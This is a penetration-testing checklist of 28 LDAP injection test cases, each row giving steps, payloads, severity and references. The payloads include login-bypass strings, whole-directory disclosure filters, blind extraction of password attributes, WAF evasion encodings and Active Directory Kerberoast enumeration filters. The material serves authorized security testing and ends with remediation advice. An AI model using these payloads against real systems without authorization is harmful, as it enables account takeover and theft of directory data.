# LDAP Injection — Checklist

Expert per-attack **test-case matrix** for LDAP Injection — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*28 test cases · spreadsheet grid — scroll sideways for all 13 columns.*

| Operation | Test Case Name | Test Category | LDAP Context | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| LDAP-001 | Map LDAP-backed features | Recon &amp; Fingerprint | N/A | Corporate/SSO/VPN/appliance login, people/directory search, group/role checks, signup uniqueness | 1. Find every LDAP-backed feature: login (corporate/SSO/VPN/printer/MFP), 'find people/employees' search, group/role authorization checks, 'forgot username', signup uniqueness checks.<br>2. Note which reflect results (data-reflected) vs only succeed/fail (auth-oracle).<br>3. Group/role checks are often higher impact than the login. | A catalogue of LDAP sinks with their observability class. | <code>corporate login form; /directory?q= people search; role check on an admin feature</code> | Defines the LDAP attack surface; authz checks frequently outrank the login for impact. | Info | 0.0 (N/A) | Burp Suite Pro, manual | CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection |
| LDAP-002 | Grep source for filter-building code | Recon &amp; Fingerprint | N/A | Gray-box: source / JS | 1. Search for raw filter concatenation: ldap_search, DirContext.search, DirectorySearcher, search_filter, ldapjs.<br>2. Distinguish parameterised/escaped filters (safe) from string-built ones.<br>3. Map hits to reachable inputs. | Code paths building LDAP filters/DNs by concatenation are identified. | <code>grep -rEn "ldap_search&#124;DirContext.search&#124;DirectorySearcher&#124;search_filter&#124;ldapjs" .</code> | Pinpoints true injection sinks and proves root cause. | Info | 0.0 (N/A) | ripgrep, Semgrep | CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection |
| LDAP-003 | Fingerprint the directory backend | Recon &amp; Fingerprint | N/A | Error messages / attribute names | 1. Active Directory hints: sAMAccountName, memberOf, DC=..., DSID errors.<br>2. OpenLDAP/389 hints: uid, cn, inetOrgPerson, javax.naming errors.<br>3. Flag second-order fields (displayName/description/group name) later consumed by admin search/sync. | The backend (AD vs OpenLDAP/389/etc.) and any second-order sinks are identified. | <code>AD: sAMAccountName / DSID-xxxx  &#124;  OpenLDAP: javax.naming.NamingException</code> | Backend choice selects the attribute set (AD Kerberoast/AS-REP vs generic) and parser tolerance. | Info | 0.0 (N/A) | Burp Repeater, ldapsearch | CWE-90; OWASP WSTG-INPV-06; HackTricks LDAP injection |
| LDAP-004 | Special-character baseline &amp; observability class | Detection — Baseline | AND / OR / DN | Any candidate LDAP input | 1. Send a normal value, then a single &#42; , then a single ( .<br>2. Record result-count / error / auth result / response length for each.<br>3. Classify observability: DATA-REFLECTED / AUTH-ORACLE / ERROR-BASED / BLIND. | A &#42; or ( changes result count, throws an LDAP error, or alters the auth result. | <code>q=alice   vs   q=&#42;   vs   q=(</code> | First signal of injectability and how you'll observe the oracle downstream. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Repeater | CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection; PayloadsAllTheThings/LDAP Injection |
| LDAP-005 | Determine filter context (AND vs OR, filter vs DN) | Detection — Baseline | AND / OR / DN | Confirmed candidate | 1. Decide AND (&amp;(fixed)(x=INPUT)) vs OR (&#124;(fixed)(x=INPUT)) vs DN context.<br>2. Check whether &#42; ( ) \ are escaped (e.g. \2a shows in errors).<br>3. If filter-escaped, plan DN injection / second-order / WAF evasion. | The context is identified (AND/OR/filter/DN) and escaping behaviour known. | <code>&#42;)(objectClass=&#42;) widens under AND ; )( breakouts work only on tolerant parsers</code> | Context dictates which breakout works; escaping tells you whether to pivot to DN/second-order. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Repeater | CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection |
| LDAP-006 | Special-character probes | Detection — Probing | AND / OR | Any LDAP input | 1. Send each metachar ALONE vs a normal value: &#42; ( ) &amp; &#124; ! \ = %00.<br>2. Watch result-count change / LDAP error / auth diff / response length.<br>3. \ alone often errors ('invalid escape'); ( often errors if injectable. | One or more metacharacters change results or trigger an LDAP error. | <code>&#42; ( ) &amp; &#124; ! \ = %00   (each sent alone)</code> | Establishes which metacharacters reach the filter unescaped. | Medium | 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) | Burp Repeater, poc/ldap_fuzz.py | CWE-90; OWASP WSTG-INPV-06; PayloadsAllTheThings/LDAP Injection |
| LDAP-007 | Prove filter-logic change (not reflection) | Detection — Probing | AND | Search/directory sink | 1. Compare q=alice (1 row) vs q=&#42;)(objectClass=&#42;) (whole tree).<br>2. A jump from one entry to everything proves the filter logic was altered - not mere reflection.<br>3. Record the entry-count delta. | q=&#42;)(objectClass=&#42;) returns far more entries than a specific value - proven logic change. | <code>q=&#42;)(objectClass=&#42;)</code> | Distinguishes real injection from a reflected &#42; (the #1 false positive). | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater | CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection; PayloadsAllTheThings/LDAP Injection |
| LDAP-008 | AND-context breakout | Detection — Breakout | AND | AND filter (&amp;(fixed)(attr=INPUT)) | 1. &#42; -&gt; match any with attr.<br>2. &#42;)(objectClass=&#42;) -&gt; stays a single valid &amp; -&gt; whole tree.<br>3. &#42;))(&#124;(objectClass=&#42;) -&gt; break OUT of the AND and OR-true the rest (tolerant parsers only).<br>4. admin)(&amp;) -&gt; absolute-true inside the group. | The AND filter is widened or broken out of, returning unintended entries. | <code>&#42;)(objectClass=&#42;)<br>&#42;))(&#124;(objectClass=&#42;)<br>admin)(&amp;)</code> | Core primitive for disclosure/auth-bypass in the common AND login/search filter. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater | CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection |
| LDAP-009 | OR-context breakout | Detection — Breakout | OR | OR filter (&#124;(fixed)(attr=INPUT)) | 1. &#42; -&gt; matches everything with attr.<br>2. nope)(uid=&#42;) -&gt; your OR clause matches all.<br>3. Confirm the widened match via result count. | The OR filter matches all entries via the injected always-true clause. | <code>nope)(uid=&#42;)</code> | Disclosure/bypass primitive for OR-based filters. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater | CWE-90; OWASP WSTG-INPV-06; PayloadsAllTheThings/LDAP Injection |
| LDAP-010 | Error-based detection &amp; backend leak | Detection — Error-Based | AND / OR | Sink that surfaces LDAP errors | 1. Trigger an LDAP error with ( or \ .<br>2. Capture the backend type and base DN from the message (DSID / javax.naming / base DN).<br>3. Use the leaked DN for DN injection / ldapsearch. | An LDAP error message discloses the backend and/or base DN. | <code>q=(   -&gt;  error revealing DSID-... or javax.naming.NamingException + base DN</code> | Fingerprints the directory and leaks the DN needed for deeper exploitation. | Medium | 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) | Burp Repeater | CWE-90; OWASP WSTG-INPV-06; HackTricks LDAP injection |
| LDAP-011 | Blind boolean oracle | Detection — Blind | AND | Sink with no reflected data but a stable true/false response | 1. Build the oracle: TRUE q=alice)(uid=alice) vs FALSE q=alice)(uid=nobody999).<br>2. Confirm a stable, repeatable response difference.<br>3. This oracle drives existence checks and char-by-char extraction. | The two payloads yield consistently different responses - a usable boolean oracle. | <code>TRUE:  alice)(uid=alice)<br>FALSE: alice)(uid=nobody999)</code> | Enables blind extraction where no data is reflected. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Intruder, poc/ldap_blind.py | CWE-90; OWASP WSTG-INPV-06; Chema Alonso et al., 'LDAP Injection &amp; Blind LDAP Injection' (Black Hat EU 2008) |
| LDAP-012 | Auth bypass — known username | Impact — Auth Bypass | AND (login) | Login filter (&amp;(uid=$user)(userPassword=$pass)) | 1. Comment/neutralise the password clause for a known user.<br>2. admin)(&amp;) (absolute-true); admin)(&#124;(uid=&#42; (OR-true, tolerant); admin))%00 (NUL truncate the password clause).<br>3. Note which account you land as (admin = Critical). | You authenticate as the named user without a valid password. | <code>admin)(&amp;)<br>admin)(&#124;(uid=&#42;<br>admin))%00</code> | Direct account takeover; as admin it is full compromise. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | OWASP WSTG-INPV-06; CWE-90; CWE-287; PortSwigger Web Security Academy: LDAP injection |
| LDAP-013 | Auth bypass — unknown username (first/any entry) | Impact — Auth Bypass | AND (login) | Login filter, no known username | 1. Log in as the first/any entry (often admin/service).<br>2. user=&#42; pass=&#42; ; or &#42;)(uid=&#42;))(&#124;(uid=&#42; ; or &#42;)(&#124;(objectClass=&#42;).<br>3. Note the resulting account. | Authentication succeeds as an arbitrary (often privileged) directory entry. | <code>&#42;  (user and pass)<br>&#42;)(uid=&#42;))(&#124;(uid=&#42;</code> | Account takeover without any valid credentials - often lands on a service/admin account. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | OWASP WSTG-INPV-06; CWE-90; CWE-287; PortSwigger Web Security Academy: LDAP injection; PayloadsAllTheThings/LDAP Injection |
| LDAP-014 | Auth bypass — both fields (classic breakout) | Impact — Auth Bypass | AND (login) | Login where both user and pass are concatenated | 1. Inject the OWASP/PortSwigger dual-field breakout into both fields.<br>2. user=&#42;)(uid=&#42;))(&#124;(uid=&#42; and pass=&#42;)(uid=&#42;))(&#124;(uid=&#42; .<br>3. Confirm login. | The combined breakout makes the whole login filter always-true. | <code>user = &#42;)(uid=&#42;))(&#124;(uid=&#42;<br>pass = &#42;)(uid=&#42;))(&#124;(uid=&#42;</code> | Reliable auth bypass on tolerant parsers where single-field payloads fail. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | OWASP WSTG-INPV-06; CWE-90; CWE-287; PortSwigger Web Security Academy: LDAP injection |
| LDAP-015 | Directory disclosure — whole subtree | Impact — Info Disclosure | AND | People/directory search | 1. q=&#42;)(objectClass=&#42;) to return the whole subtree (AND-true).<br>2. Quantify extra entries vs the intended scope.<br>3. Bound the read - sample, do not mass-dump. | The search returns the entire subtree instead of the intended narrow result. | <code>q=&#42;)(objectClass=&#42;)<br>q=&#42;)(cn=&#42;)</code> | Mass PII disclosure from the directory - High (Critical if hashes present). | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater | OWASP WSTG-INPV-06; CWE-90; PortSwigger Web Security Academy: LDAP injection |
| LDAP-016 | Disclosure — match hidden/high-value attributes | Impact — Info Disclosure | AND | Directory search | 1. Force-match on hidden attributes: )(mail=&#42; , )(telephoneNumber=&#42; , )(memberOf=&#42; .<br>2. )(userPassword=&#42; -&gt; if readable = hashes (Critical).<br>3. AD: )(sAMAccountName=&#42; , )(servicePrincipalName=&#42; .<br>4. Alphabetical harvest if capped: a&#42; b&#42; admin&#42; svc&#42;. | Entries with sensitive attributes (memberOf/userPassword/SPN) are returned. | <code>q=&#42;)(userPassword=&#42;)<br>q=&#42;)(memberOf=&#42;)<br>q=&#42;)(servicePrincipalName=&#42;)</code> | Exposure of credentials/hashes, group membership, and AD SPNs - High to Critical. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater, ldapsearch | OWASP WSTG-INPV-06; CWE-90; HackTricks LDAP injection |
| LDAP-017 | Authorization/privilege-escalation via group check | Impact — Authz Bypass | AND (authz) | Group/role check (&amp;(uid=$you)(memberOf=CN=Admins,...)) | 1. Force the membership clause always-true: you)(memberOf=&#42; or you)(&#124;(memberOf=&#42;) or you)(&amp;).<br>2. Or match the admins group regardless: &#42;)(memberOf=CN=Domain Admins,$DC .<br>3. For NOT-based deny filters, add an always-true sibling / break the NOT.<br>4. Confirm you reach the admin-only feature. | The authorization check passes and an admin-only feature becomes reachable. | <code>you)(memberOf=&#42;<br>&#42;)(memberOf=CN=Domain Admins,$DC</code> | Privilege escalation - often higher impact than the login bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | OWASP WSTG-INPV-06; CWE-90; CWE-285; PortSwigger Web Security Academy: LDAP injection |
| LDAP-018 | Blind extraction — presence/existence oracle | Impact — Blind Extraction | AND | Blind sink with a boolean oracle | 1. Existence: (&amp;(uid=USERNAME)(objectClass=&#42;)) -&gt; does the user exist?<br>2. Attribute presence: (&amp;(uid=admin)(userPassword=&#42;)) -&gt; readable password attr?<br>3. Privilege: (&amp;(uid=admin)(memberOf=CN=Domain Admins,$DC)). | The oracle confirms existence/attribute-presence/privilege of a target entry. | <code>(&amp;(uid=admin)(userPassword=&#42;))<br>(&amp;(uid=admin)(memberOf=CN=Domain Admins,$DC))</code> | Enumerates users, sensitive attributes, and privileged accounts blindly. | Medium | 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) | Burp Intruder, poc/ldap_blind.py | CWE-90; OWASP WSTG-INPV-06; Chema Alonso et al., 'LDAP Injection &amp; Blind LDAP Injection' (Black Hat EU 2008) |
| LDAP-019 | Blind extraction — char-by-char (substring wildcard) | Impact — Blind Extraction | AND | Blind sink with a boolean oracle, benign test attribute | 1. First char: (&amp;(uid=admin)(userPassword=a&#42;)) -&gt; iterate the charset.<br>2. Grow the prefix once confirmed: (&amp;(uid=admin)(userPassword=ab&#42;)).<br>3. Binary-search with &gt;= / &lt;= to cut requests ~log2.<br>4. Extract only a few BENIGN chars of a benign attribute (your test user). | The oracle reveals attribute characters one prefix at a time. | <code>(&amp;(uid=admin)(userPassword=a&#42;))<br>(&amp;(uid=admin)(userPassword&gt;=m&#42;))</code> | Full blind attribute extraction (proven with a bounded, benign read). | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Intruder, poc/ldap_blind.py | CWE-90; OWASP WSTG-INPV-06; Chema Alonso et al., 'LDAP Injection &amp; Blind LDAP Injection' (Black Hat EU 2008); PayloadsAllTheThings/LDAP Injection |
| LDAP-020 | DN injection | Impact — DN Injection | DN | Input that builds a DN (uid=$user,ou=people,$DC) | 1. When the filter is escaped but the DN is built from input, inject DN metachars.<br>2. x,ou=admins -&gt; uid=x,ou=admins,ou=people,$DC (changes OU/scope).<br>3. Test the RFC 4514 DN set: , + " \ &lt; &gt; ; = and leading/trailing space, leading #. | The injected DN component changes the OU/scope of the operation. | <code>x,ou=admins<br>(DN chars: , + " \ &lt; &gt; ; =)</code> | Scope/OU manipulation when filter injection is blocked - reaches other subtrees. | High | 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater | OWASP WSTG-INPV-06; CWE-90; PayloadsAllTheThings/LDAP Injection |
| LDAP-021 | Second-order LDAP injection | Impact — Second-Order | AND / OR | Stored profile field later consumed by admin search/sync | 1. Store a payload in a profile field (displayName/description/group name).<br>2. Trigger the consumer (admin directory search, sync job).<br>3. Confirm the filter logic fires when the stored value is used: displayName=&#42;)(objectClass=&#42; . | The stored payload alters an LDAP filter when a later feature consumes it. | <code>displayName = &#42;)(objectClass=&#42;   (fires on admin search/sync)</code> | Bypasses input-facing defenses and often executes at higher privilege. | High | 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N) | Burp Suite, manual | OWASP WSTG-INPV-06; CWE-90; PortSwigger Web Security Academy: LDAP injection |
| LDAP-022 | AD enumeration chains (Kerberoast / AS-REP) | Impact — AD Post-Exploitation | AND (Active Directory) | Active Directory backend, authorized red-team | 1. Once an injected filter or bind lets you query AD, enumerate high-value objects.<br>2. SPN accounts (Kerberoast): (servicePrincipalName=&#42;).<br>3. AS-REP (no preauth): (userAccountControl:1.2.840.113556.1.4.803:=4194304).<br>4. Privileged: (adminCount=1). Use as proof; do not pivot out of scope. | AD Kerberoast/AS-REP/privileged accounts are enumerated via the injected/bound query. | <code>(servicePrincipalName=&#42;)<br>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code> | Feeds Kerberoast/AS-REP offline cracking -&gt; AD lateral movement (authorized only). | High | 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N) | ldapsearch, windapsearch, BloodHound | CWE-90; OWASP WSTG-INPV-06; The Hacker Recipes: Active Directory; HackTricks LDAP injection |
| LDAP-023 | Confirm via ldapsearch (once any bind is available) | Impact — Verification | N/A | Anonymous or credentialed bind to the directory | 1. Anonymous bind (if allowed): ldapsearch -x -H ldap://dc -b "$DC" "(objectClass=&#42;)".<br>2. With creds: add -D bind-DN -w PASS and target attrs (mail memberOf).<br>3. Use to confirm exactly what an injected filter would return. | The directory returns the entries an injected filter would match, confirming impact. | <code>ldapsearch -x -H ldap://dc.$TARGET -b "$DC" "(uid=&#42;)" mail memberOf</code> | Concretely quantifies the injected filter's reach for the report. | Medium | 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) | ldapsearch, windapsearch | CWE-90; OWASP WSTG-INPV-06; HackTricks LDAP injection |
| LDAP-024 | Encoding evasion (URL / double / LDAP-hex) | Evasion — WAF/Filter | AND / OR | WAF/filter blocking LDAP metacharacters | 1. URL-encode: &#42;-&gt;%2a (-&gt;%28 )-&gt;%29 \-&gt;%5c &amp;-&gt;%26 &#124;-&gt;%7c =-&gt;%3d !-&gt;%21 NUL-&gt;%00.<br>2. Double-encode where a decode precedes the filter: &#42;-&gt;%252a.<br>3. LDAP hex where the app un-escapes: \2a (=&#42;), \28 (=(), \29 (=)). | The encoded metacharacter survives the WAF and is decoded into the filter. | <code>q=%2a%29%28objectClass=%2a<br>q=\2a\29\28objectClass=\2a</code> | Bypasses signature filters that block only literal metacharacters. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater, CyberChef | CWE-90; OWASP WSTG-INPV-06; PayloadsAllTheThings/LDAP Injection |
| LDAP-025 | Absolute-true (&amp;) and NUL truncation | Evasion — WAF/Filter | AND / OR | Filters blocking ( ) or trailing-clause exploitation | 1. Absolute-true (&amp;) needs only &amp; - tiny, often un-blacklisted (absolute-false (&#124;)).<br>2. NUL truncate: append %00 to drop trailing clauses (C-backed servers).<br>3. Combine with a known username for a clean bypass. | (&amp;) forces truth without parentheses payloads, or %00 removes the password clause. | <code>admin)(&amp;)<br>admin))%00</code> | Minimal-footprint bypass that evades parenthesis/keyword filters. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater | CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection |
| LDAP-026 | Attribute aliasing / swap | Evasion — WAF/Filter | AND / OR | Filters blocking a specific attribute keyword | 1. objectClass blocked -&gt; use cn / uid / objectCategory (always-present alternatives).<br>2. AD attributes are case-insensitive with aliases: sAMAccountName, commonName/cn.<br>3. Whitespace/full-width where the directory normalises but the WAF does not. | An aliased/alternative attribute achieves the same match past the keyword filter. | <code>q=&#42;)(objectCategory=&#42;)   (objectClass blocked)<br>q=&#42;)(cn=&#42;)</code> | Keeps disclosure/bypass working when a specific attribute keyword is filtered. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater | CWE-90; OWASP WSTG-INPV-06; PayloadsAllTheThings/LDAP Injection |
| LDAP-027 | False-positive filter (rule out reflection / JNDI) | Validation &amp; Reporting | N/A | Before reporting any candidate | 1. Reject: a &#42; merely reflected (no change in matched entries); a lone 500/LDAP error with no logic change; a built-in wildcard search behaving as designed; username-enumeration via error differences (separate, lower bug); a single length blip (caching/jitter); logging in as a demo/guest account.<br>2. CRITICAL: ${jndi:ldap://...} callback is Log4Shell/JNDI (CVE-2021-44228) RCE - report as its OWN bug, not filter injection.<br>3. Require the directory's answer to demonstrably change (rows / auth result / stable oracle). | A confirmed filter-logic change with impact - not reflection, an error, a built-in feature, or JNDI. | <code>q=&#42;)(objectClass=&#42;) returns whole tree vs 1 row; oracle stable across retries</code> | Protects credibility; LDAP injection is often confused with reflection, enum, or Log4Shell. | Info | 0.0 (N/A) | Burp, manual | OWASP WSTG-INPV-06; CWE-90; Log4Shell CVE-2021-44228 (distinct) |
| LDAP-028 | Client-facing impact &amp; PoC package (CWE-90) | Validation &amp; Reporting | N/A | Confirmed finding, pre-submission | 1. Lead with the highest impact (auth bypass &gt; authz/privesc &gt; disclosure &gt; blind).<br>2. Provide the exact request, context (AND/OR/DN), backend, and proof (extra rows / auth result / stable oracle); bound every read.<br>3. Set CVSS 3.1 + CWE-90 (+ CWE-287 auth bypass / CWE-285 authz). Remediation: parameterised LDAP APIs / proper filter escaping (RFC 4515) and DN escaping (RFC 4514), least-privilege bind account, input allowlisting, disable anonymous bind.<br>4. De-dupe to one finding per sink. | A reproducible, correctly-rated, benign PoC with clear remediation. | <code>PoC: request + context + proof (rows/auth/oracle) + CVSS + CWE-90 + fix guidance.</code> | Converts the finding into a defensible, actionable report at the correct severity. | Info | 0.0 (N/A) | Burp, CVSS calculator, LDAP_INJECTION_REPORT_TEMPLATE.md | OWASP WSTG-INPV-06; CWE-90; CWE-287; FIRST CVSS v3.1  &#124;  TOP REFERENCES: PortSwigger; PayloadsAllTheThings; HackTricks; BlackHat LDAP injection research; MITRE CWE-90 |
